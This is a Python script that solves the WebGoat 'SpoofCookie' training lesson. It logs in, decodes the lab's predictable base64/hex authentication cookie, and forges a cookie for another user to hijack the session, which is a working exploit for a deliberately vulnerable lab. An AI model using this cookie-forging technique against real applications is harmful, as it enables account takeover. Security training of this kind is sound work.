#!/usr/bin/env python

import sys
import json
import requests
import base64
from binascii import hexlify
import argparse

'''
        You can run this script using the following command:

        python spoof_cookie.py --attack-url 'http://www.webgoat.local:8080/WebGoat/SpoofCookie/login' \
            --site-cookie 'o93vFbe4uNClMi2_JV2lic_9jHU6Tu6C_YaNRKeT' --username 'webgoat' --path '/WebGoat'

        or using short form:

        python spoof_cookie.py -a 'http://www.webgoat.local:8080/WebGoat/SpoofCookie/login' \
            -c 'o93vFbe4uNClMi2_JV2lic_9jHU6Tu6C_YaNRKeT' -u 'webgoat' -p '/WebGoat'
'''


class SessionHijack:
    # Initializer with attack_url and session cookie
    def __init__(self, attack_url, webgoat_cookie):
        self.attack_url = attack_url
        self.login_session = webgoat_cookie
        self.headers = {
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": "33",
            "charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        self.random_auth_string = ''
        self.extracted_cookie = ''

    # Method to find random auth token
    def find_random_auth_token(self, username, path):
        print("[*] Attempting to spoof authentication")
        cookies = dict(
            JSESSIONID=self.login_session,
            path=path,
            discard="true",
            secure="false",
            Version="1",
            spoof_auth=""
        )
        data = dict(
            username=username,
            password=username,
            spoof_auth=""
        )

        # Send request and process the response
        response = requests.post(
            self.attack_url, headers=self.headers, cookies=cookies, data=data)
        response_json = json.loads(response.text)
        response_output = response_json["output"]
        response_feedback = response_json["feedback"]
        response_assignment = response_json["assignment"]

        # Print the responses
        self._print_response(response_assignment,
                             response_feedback, response_output)

        # Processing the response cookie
        spoof_cookie = (response_output.split("spoof_auth=", 1)[1])
        self.extracted_cookie = spoof_cookie
        self._decode_cookie(spoof_cookie, username)

    # Method to spoof cookie
    def spoof_cookie(self, username, path):
        print("[*] Attempting to spoof auth cookie: {} \n[*]\t for user: {}".format(
            self.extracted_cookie,
            username
        ))

        # Creating the spoofed cookie
        reversed_random_token = (username + self.random_auth_string)[::-1]
        spoofed_cookie = base64.b64encode(
            hexlify(reversed_random_token.encode())).decode()

        # Send spoofed cookie request and process the response
        cookies = dict(
            JSESSIONID=self.login_session,
            path=path,
            discard="true",
            secure="false",
            Version="1",
            spoof_auth=spoofed_cookie
        )
        data = dict(
            username="",
            password="",
            spoof_auth=spoofed_cookie
        )

        response = requests.post(
            self.attack_url, headers=self.headers, cookies=cookies, data=data)

        # Print the responses
        response_json = json.loads(response.text)
        lesson_completed = response_json["lessonCompleted"]
        response_output = response_json["output"]
        response_feedback = response_json["feedback"]
        response_assignment = response_json["assignment"]

        if lesson_completed:
            self._print_response(response_assignment,
                                 response_feedback, response_output)

        else:
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            print("[*] Failed to spoof the session.")

    # Helper function to decode cookie
    def _decode_cookie(self, spoof_cookie, username):
        base16_decoded_cookie = int(base64.b64decode(spoof_cookie), 16)

        decoded_cookie = ''
        while base16_decoded_cookie != 0:
            decoded_cookie += chr(base16_decoded_cookie & 255)
            base16_decoded_cookie = base16_decoded_cookie >> 8

        self.random_auth_string = decoded_cookie.split(username, 1)[1]

    # Helper function to print responses
    def _print_response(self, assignment, feedback, output):
        print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
        print("[+] Assignment: {}".format(assignment))
        print("[+] Feedback: {}".format(feedback))
        print("[+] Cookie Value: {}".format(output))
        print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")


def main():
    parser = argparse.ArgumentParser(description='Session Hijacking script.')
    parser.add_argument('-a', '--attack-url', type=str,
                        help='The URL to attack', required=True)
    parser.add_argument('-c', '--site-cookie', type=str,
                        help='Site cookie', required=True)
    parser.add_argument('-u', '--username', type=str,
                        help='Username', required=True)
    parser.add_argument('-p', '--path', type=str, help='Path', required=True)

    args = parser.parse_args()

    session_hijack = SessionHijack(args.attack_url, args.site_cookie)
    session_hijack.find_random_auth_token(args.username, args.path)
    session_hijack.spoof_cookie(args.username, args.path)


if __name__ == "__main__":
    main()
